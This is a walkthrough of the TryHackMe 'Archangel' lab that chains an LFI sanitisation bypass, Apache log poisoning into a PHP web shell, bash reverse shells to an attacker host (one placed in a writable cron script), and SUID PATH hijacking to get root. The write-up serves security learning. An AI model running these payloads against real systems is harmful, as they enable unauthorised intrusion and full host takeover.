# Try Hack Me - Archangel
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 210
# Vulnerabilities: LFI, RCE via log poisoning, cronjob abuse, PATH hijacking

# Phase 1 - Reconnaissance: 
nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

lets start with enumerating with the webpage on the port 80. on the main page we find a mafialive solutions webisite. in the send us a mail section on the top of the page we find a possible entry for the hostname of the machine. as we know tryhackme's hostnames usually end with a .thm, this could possibly be the answer to our first question
![image1](https://github.com/realatharva15/archangel_writeup/blob/main/images/Screenshot%202026-01-16%20at%2012-59-29%20Wavefire.png)

lets add this hostname to our /etc/hosts file

```bash
echo "<target_ip mafialive.thm>" | sudo tee -a /etc/hosts
```
on accessing the website with the proper hostname, we find the flag1 of the ctf. 
```bash
#in your browser:
http://mafialive.thm
```
we submit the flag1 nad lets enumerate further. lets use gobuster to fuzz the hidden directories and find the page under development.

```bash
gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt
```
/.hta                 (Status: 403) [Size: 278]

/.htpasswd            (Status: 403) [Size: 278]

/.htaccess            (Status: 403) [Size: 278]

/index.html           (Status: 200) [Size: 59]

/robots.txt           (Status: 200) [Size: 34]

/server-status        (Status: 403) [Size: 278]

lets navigate to the /robots.txt directory and find out if we can get any hints related to the page under development. the robots.txt says "User-agent: *
![image2](https://github.com/realatharva15/archangel_writeup/blob/main/images/Screenshot%202026-01-16%20at%2013-12-01%20.png)
Disallow: /test.php". lets navigate to the /test.php directory. bingo! turns out that the /test.php directory is the page which is under development. now we submit this answer. now as we can see in the url, there is a "view" parameter which listing the directories inside /var. this is a classis LFI vulnerability.

```bash
#the vulnerable paramter:
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```
here we can use the php filters to access sensitive files on the system in order to get an intial foothold. we use the payload from PayloadAllTheThings on github and use this thing called as a php filter. 

```bash
#the payload will look like this:
http://mafialive.thm/test.php/?view=php://filter/convert.base64-encode/resource=/var/wwww/html/development_testing/test.php 
```
![testimage](https://github.com/realatharva15/archangel_writeup/blob/main/images/test.php.png)
we use this to view the contents of the test.php file. the contents are encoded in base64 so we will use cyberchef to decode the program.

![image3](https://github.com/realatharva15/archangel_writeup/blob/main/images/Screenshot%202026-01-16%20at%2013-31-31%20From%20Base64%20-%20CyberChef.png)

from the code we understand that there is some kind of sanitization which can block LFI to some extent. we can find a way around this inorder to access files like /etc/passwd on the system. 

the php code goes like:
```bash

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: < REDACTED >

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>

```
the flag2 is also mentioned inside the code, submit it. now i will explain the sanitization to you. 

the if statement: 

```bash
 if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
```
what this does is that if you see there are 2 conditions which are validating the if statement. the 1st condition willcheck if the url contains the string "../.." or not. the 2nd condtion checks whether the path in the url is /var/www/html/development_testing or not. since there is an AND operator between both the conditons, if the first condition is TRUE and the second condition is FASLE  then the program will display the text "Sorry, Thats not allowed". in order to bypass this sanitization, we have to make sure that we make sure the 1st condition remians FALSE and the second condition remains TRUE

this means we will have to use an alternative to "../.." and we will have to mention the path "/var/www/html/development_testing" somewhere in the url payload. 

```bash
#for accessing the /etc/passwd
..//..//..//..//etc/passwd 
```
we will try using this payload. but wait, we still have to mention the /var/www/html/development_testing path in the payload. so the final payload will become:

```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd
```
![image4](https://github.com/realatharva15/archangel_writeup/blob/main/images/bypassingsanitization.png)

as you can see, we have successfully bypassed the sanitization! we can further decode the base64 encoded /etc/passwd file and find out information about the users on the system. there is a user named archangel on the system. maybe we can try to exfiltrate his id_rsa inside his home directory. if that is possible we would not even require to carry out RCE on the target machine. after some manual payloads either the current user (www-data) does not have the permissions to access archangel's id_rsa, or simply they do not exist on the system. whatever the reason be, it is clear that in order to get a shell on the system we will have to caryy out RCE.

i also noticed that there is no need for the base64 filter, i did it because it is considered as good practice. i did some research on DeepSeek and found out that i can carry out RCE via LFI if i poison the apache logs! i got the idea of log poisoning from the hint given in the user flag question. lets use this payload and poison the logs via curl

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://mafialive.thm/
```
we have injected the cmd parameter in the system, now lets test if the RCE is working or not. 

```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=id
```
as you can see in the image below we have sucessfully poisoned the logs and achieved RCE via LFI on the machine. lets use a reverseshell and setup a netcat listener in another terminal
![image5](https://github.com/realatharva15/archangel_writeup/blob/main/images/logpoisoning.png)

```bash
#first setup the netcat listner
nc -lnvp 4444
```
now paste this payload in your firefox browser. 
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<attacker_ip>/4444%200%3E%261%27
```
we finally get a shell as www-data. now lets quickly enumerate the machine by running the linpeas.sh script. after analyzing the output of the linpeas.sh script, we find out that there is a cronjob that runs every minute as archangel. the script used in the cron job is /opt/helloworld.sh. the good news is that we have write permissions to the script! lets add a revershell to the script which will grant us a shell as archangel

```bash
#first setup a netcat listener
nc -lnvp 1234
```
now we will overwrite the contents of the entire helloworld.sh script with our malicious reverseshell.
```bash
#overwrite the entire script with a shebang
echo '#!/bin/bash' > /opt/helloworld.sh
```
```bash
#now append the script with a reverseshell payload
echo 'bash -i >& /dev/tcp/192.168.132.190/1234 0>&1' >>/opt/helloworld.sh
```
now we will patiently wait for the cronjob to execute in order to get a shell as archangel. after about one minute, we get a shell as archangel on our netcat listner!

# Phase 3 - Privilege Escalation:
now its time to level up our game and get root access on the system. the linpeas script revealed about a custom SUID at the location /home/archangel/secret/backup. lets analyze this binary to see what it actually does. since it is a binary, i will contain a lot of gibberish that we wont be able to understand. thus we will use the strings command to filter out only what is readable.

```bash
strings /home/archangel/secret/backup
```
we find a line in the binary which goes like this:
```bash
#huge vulnerability in the binary:
cp /home/user/archangel/myfiles/* /opt/backupfiles
```
the reason why this is a major vulnerabulity is because it is not using the absolute path of the cp command i.e /bin/cp. this makes it easy for us to exploit this SUID as we can create our own malicous cp file which will spawn a shell when executed. 

```bash
#creating a malicous cp file in /tmp:
echo '#!/bin/bash'>/tmp/cp
```
now we will append /bin/bash into the malicous file. this will make sure that when the SUID runs as root user, we will get a shell as root!

```bash
echo '/bin/bash'>>/tmp/cp
```
now lets give this file the appropriate permissions
```bash
#making the malicious file executable:
chmod +x /tmp/cp
```
now we are all set. we have one last thing to do which is to manipulate the PATH variable in order to point towards the /tmp directory. since the binary will execute whichever cp file it finds first and then move on, we will make sure that it must execute our cp file first before the actual /bin/cp file.

```bash
#PATH hijacking:
export PATH=/tmp:$PATH
```
now you can check for yourselves if the path variable is set or not. once we execute the SUID binary, we will immediately get a shell as root

```bash
#execute the SUID binary to trigger the exploit:
/home/archangel/secret/backup
```
and there we go, we finally have a root shell. we read and submit the root.txt flag present at the location /root/root.txt
                                           
